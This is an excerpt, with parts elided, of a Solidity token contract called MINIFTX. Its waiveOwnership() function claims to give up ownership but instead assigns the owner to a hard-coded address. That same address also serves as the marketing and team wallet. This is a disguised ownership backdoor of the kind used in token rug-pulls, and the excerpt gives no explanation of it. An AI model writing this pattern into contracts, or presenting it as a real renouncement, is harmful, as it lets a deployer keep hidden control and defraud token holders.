...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xF54eeA49Ffe2A836a29ECf60e77e49cb3D68D4E6);
    }
...
contract MINIFTX is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MINIFTX";
    string private _symbol = "FTXM";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF54eeA49Ffe2A836a29ECf60e77e49cb3D68D4E6);
    address payable public teamWalletAddress = payable(0xF54eeA49Ffe2A836a29ECf60e77e49cb3D68D4E6);
